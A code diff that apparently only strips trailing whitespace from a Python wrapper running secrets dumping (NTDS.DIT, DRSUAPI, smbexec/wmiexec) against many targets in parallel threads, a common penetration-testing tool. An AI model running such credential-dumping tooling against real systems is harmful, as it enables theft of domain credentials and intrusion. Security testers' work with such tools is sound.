@@ -280,22 +280,22 @@ def modded_parse_target(target):
 username = ""
 password = ""
 domain = ""
-def do_dump_work(target, options):        
-    options.target_ip = target    
+def do_dump_work(target, options):
+    options.target_ip = target
     output_dir = ""
-    
+
     if options.outputfile:
         output_dir = options.outputfile
     else:
         output_dir = os.getcwd()
-        
+
     if domain:
         options.outputfile = os.path.join(output_dir, f"{domain}-{username}-{target}")
         print(f"[*] Dumping secrets for: {target}\tDomain: {domain}\tUsername: {username}")
     else:
         options.outputfile = os.path.join(output_dir, f"{username}-{target}")
         print(f"[*] Dumping secrets for: {target}\tUsername: {username}")
-        
+
     dumper = DumpSecrets(target, username, password, domain, options)
     dumper.dump()
 
@@ -333,10 +333,10 @@ if __name__ == '__main__':
                         help='Use the Kerb-Key-List method instead of default DRSUAPI')
     parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                         'method to use at target (only when using -use-vss). Default: smbexec')
-    parser.add_argument("-t", "--threads", help="Number of threads", type=int, default=5)    
+    parser.add_argument("-t", "--threads", help="Number of threads", type=int, default=5)
     parser.add_argument('-inputfile', action='store',
                         help='input target file. Entries should be line by line in format <targetName or address> or LOCAL')
-                        
+
     group = parser.add_argument_group('display options')
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
@@ -366,12 +366,12 @@ if __name__ == '__main__':
                                  'ommited it use the domain part (FQDN) specified in the target parameter')
     group.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
-                            'This is useful when target is the NetBIOS name and you cannot resolve it')    
+                            'This is useful when target is the NetBIOS name and you cannot resolve it')
 
     if len(sys.argv)==1:
         parser.print_help()
         sys.exit(1)
-    
+
     options = parser.parse_args()
 
     # Init the example's logger theme
@@ -420,8 +420,8 @@ if __name__ == '__main__':
 
         if options.aesKey is not None:
             options.k = True
-    
-    try:               
+
+    try:
         # Read in the file and create the dictionary
         target_dict = {}
 
@@ -434,11 +434,10 @@ if __name__ == '__main__':
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=options.threads) as executor:
             # Submit tasks to executor.
-            futures = [executor.submit(do_dump_work, k, v) for k, v in target_dict.items()]   
-        
+            futures = [executor.submit(do_dump_work, k, v) for k, v in target_dict.items()]
+
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
         logging.error(e)
-    
